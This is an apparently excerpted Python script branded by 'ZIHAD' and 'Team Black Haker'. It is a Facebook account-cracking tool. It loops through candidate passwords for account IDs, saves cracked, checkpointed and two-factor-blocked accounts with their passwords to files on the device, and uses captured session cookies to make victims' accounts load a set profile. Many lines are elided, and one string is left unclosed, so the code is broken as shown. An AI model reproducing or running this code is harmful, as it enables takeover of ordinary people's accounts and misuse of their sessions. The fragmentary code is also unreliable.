#created by ZIHAD
#team name hbf
#tottaly written by ZIHAD 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; ZIHAD \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
ZIHAD2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 ZIHAD 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   ZIHAD 𝟑𝟔𝟎         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    https://t.me/blackhakerteam    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    ZIHAD 𝟑𝟔𝟎    \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION  \033[1;31m    ➟   \033[1;32m1.2   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mTEAM BLACK HAKER\033[1;37m {\033[1;36mTBH\033[1;37m}   \033[1;31m          
\033[1;37m╚\033[1;36mⓉⒷⒽ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐓𝐄𝐀𝐌𓆪 𓆩𓆪  𓆩BLACK 𝐇𝐀𝐂𝐊𝐄𝐑𓆪 ]\x1b[0m══════\033[1;36mⓉⒷⒽ 
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100083131624990', cookies={'cookie': coki}).text, 'html.parser')
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {ZIHADT()} {WHITE}]")
    ...
    if ZIHAD in ["1","01"]:
        ...
        os.system("xdg-open https://t.me/blackhakerteam")
        XYZ()
    elif ZIHAD in ["3","03"]:
        os.system("xdg-open https://www.youtube.com/@BLACK_HAKER_01)
        XYZ()
    elif ZIHAD in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/ZIHAD-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/ZIHAD-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio ZIHAD_OK.mp3")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio ZIHAD_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/ZIHAD-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio ZIHAD_CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ZIHAD 🔥] [%s] \33[1;97m[OK:%s{ZIHAD2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
